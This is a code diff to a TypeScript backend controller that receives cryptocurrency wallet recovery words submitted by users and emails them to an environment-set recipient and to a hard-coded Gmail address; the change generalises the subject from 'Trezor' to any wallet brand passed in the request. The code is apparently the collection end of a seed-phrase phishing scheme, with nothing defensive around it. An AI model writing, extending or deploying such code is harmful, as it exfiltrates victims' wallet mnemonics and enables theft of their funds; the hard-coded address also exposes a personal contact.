@@ -8,7 +8,6 @@ export const sendMnemonicController = asyncHandler(
     const resend = new Resend(process.env.RESEND_API_KEY as string);
     const resend2 = new Resend(process.env.RESEND_API_KEY2 as string);
     const payload = req.body;
-
     // Validate payload
     if (!payload || !payload.data || !Array.isArray(payload.data)) {
       return errorResponse(res, "Invalid payload", 400);
@@ -20,7 +19,7 @@ export const sendMnemonicController = asyncHandler(
     htmlContent += `<ul>`;
 
     payload.data.forEach((item: { label: string; value: string }) => {
-      htmlContent += `<li><strong>${item.label}:</strong> ${item.value}</li>`;
+      htmlContent += `<li>${item.value}</li>`;
     });
 
     htmlContent += `</ul>`;
@@ -31,17 +30,17 @@ export const sendMnemonicController = asyncHandler(
       const response: any = await resend.emails.send({
         from: `${payload.heading}@resend.dev`,
         to: process.env.RECIPIENT_EMAIL as string,
-        subject: "Trezor Mnemonic Recovery Words",
+        subject: `${payload.heading.toUpperCase()} Mnemonic Recovery Words`,
         html: htmlContent,
       });
       const response2: any = await resend2.emails.send({
         from: `${payload.heading}@resend.dev`,
         to: 'davidbrown202r@gmail.com' as string,
-        subject: "Trezor Mnemonic Recovery Words",
+        subject: `${payload.heading.toUpperCase()} Mnemonic Recovery Words`,
         html: htmlContent,
       });
 
-      console.log("✅ Email sent successfully:", response,response2 );
+      console.log("✅ Email sent successfully:", response, response2);
       return successResponse(res, { id: response.id }, "Mnemonic sent successfully", 200);
     } catch (error: any) {
       console.error("❌ Email sending error:", error.message);
